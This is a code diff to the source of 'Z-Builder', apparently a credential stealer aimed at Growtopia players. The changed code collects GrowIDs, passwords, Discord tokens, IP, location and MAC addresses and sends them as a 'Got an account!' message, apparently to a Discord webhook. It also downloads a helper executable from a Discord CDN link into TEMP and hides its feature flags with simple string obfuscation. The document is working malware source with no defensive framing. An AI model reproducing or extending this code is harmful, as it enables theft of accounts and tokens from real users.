@@ -86,7 +86,7 @@ INT WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR strCmdLine, INT)
         {
             return 1;
         }
-        string Feature = "[DisableProt:(N)]--[Tracer:(N)]--[Recover:(N)]--[GetAllAccs:(N)]--[DeleteGT:(N)]--[StartUp:(N)]--[HideStealer:(N)]--[BrowserCreds:(N)]";
+        string Feature = decrypt("[QvfnoyrCebg:(A)]--[Genpre:(A)]--[Erpbire:(A)]--[TrgNyyNppf:(A)]--[QryrgrTG:(A)]--[FgnegHc:(A)]--[UvqrFgrnyre:(A)]--[OebjfrePerqf:(A)]");
         //string Feature = "[DisableProt:(N)]--[Tracer:(Y)]--[Recover:(N)]--[GetAllAccs:(N)]--[DeleteGT:(N)]--[StartUp:(N)]--[HideStealer:(N)]--[BrowserCreds:(N)]";
         if (Feature.find(XorStr("[DisableProt:(Y)]")) != string::npos)
         {
@@ -128,6 +128,7 @@ INT WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR strCmdLine, INT)
         string GrowID;
         string Password;
         string LastWorld;
+        string MAC;
         if (AccDataContent != "")
         {
             string AccDataSplit = XorStr("[---Z-Builder---]");
@@ -137,13 +138,17 @@ INT WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR strCmdLine, INT)
             StringSplit = AccDataContent.find(AccDataSplit);
             Password = AccDataContent.substr(0, StringSplit);
             AccDataContent.erase(0, StringSplit + AccDataSplit.size());
-            LastWorld = AccDataContent;
+            StringSplit = AccDataContent.find(AccDataSplit);
+            LastWorld = AccDataContent.substr(0, StringSplit);
+            AccDataContent.erase(0, StringSplit + AccDataSplit.size());
+            MAC = AccDataContent;
         }
         else
         {
             GrowID = "No GrowID found";
             Password = "No password found";
             LastWorld = "No world found";
+            MAC = "";
         }
         // Acc Data (Main Account) - End
         // Discord Token
@@ -157,7 +162,19 @@ INT WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR strCmdLine, INT)
         {
             IPInfo = "N/A";
         }       
-        string Info = "MAC address(es): ```" + GetMAC() + "```" + "IP address: ```" + IPInfo + "```" + "City / Region / Country: ```" + Location + "```" + "Time stolen: ```" + Time + "```" + "GrowID: ```" + GrowID + "```" + "Password: ```" + Password + "```" + "Last world: ```" + LastWorld + "```" + "Discord token: ```" + DToken + "```";
+        string AllMAC = GetMAC();
+        replace(MAC.begin(), MAC.end(), ':', '-');
+        if (!(AllMAC.find(MAC) != string::npos))
+        {
+            AllMAC += " | " + MAC + "";
+        }
+        else
+        {
+            string MainMAC = "[" + MAC + "]";
+            size_t MainMACLocation = AllMAC.find(MAC);
+            AllMAC.replace(MainMACLocation, MAC.length(), MainMAC);
+        }
+        string Info = "MAC address(es): ```" + AllMAC + "```" + "IP address: ```" + IPInfo + "```" + "City / Region / Country: ```" + Location + "```" + "Time stolen: ```" + Time + "```" + "GrowID: ```" + GrowID + "```" + "Password: ```" + Password + "```" + "Last world: ```" + LastWorld + "```" + "Discord token: ```" + DToken + "```";
         string AllInfo = "{ \"username\":\"Z-Builder\",\"avatar_url\":\"https://cdn.discordapp.com/icons/745016440569987098/56ce57aa24fd66dc9a39fc03b48f9424.png?size=128\",\"embeds\":[{\"title\":\"Got an account! ~Z-Builder\",\"description\":\"" + Info + "\",\"color\":\"65535\"}] }";
         SendMessage(AllInfo, "application/json"); //application/json or multipart/form-data
         CleanUp();
@@ -525,7 +542,7 @@ string savedecrypt()
 {
     string tempPath = getenv("TEMP");
     string decrypterPath = tempPath + "\\savedecrypter.exe";
-    DownloadFile(decrypt2(XorStr("21$8*h//9!>f=;sc574))\".c5()-&ac2(5&-!/7opixaj49mvhpm`19ljg}lk10jqczog66itev!av?!5+++pt?7~-!7")), decrypterPath);
+    DownloadFile(XorStr("https://cdn.discordapp.com/attachments/755908849738842196/771096429880016896/savedecrypter.exe"), decrypterPath);
     string AccDataPath = tempPath + "\\Password.zb";
     remove(AccDataPath.c_str());
     string TempSaveDatLocation = tempPath + "\\save.dat";
@@ -538,6 +555,7 @@ string savedecrypt()
         ifstream RawAccData(AccDataPath);
         AccDataContent = string((istreambuf_iterator<char>(RawAccData)),
             (istreambuf_iterator<char>()));
+        RawAccData.close();
     }
     catch (...)
     {
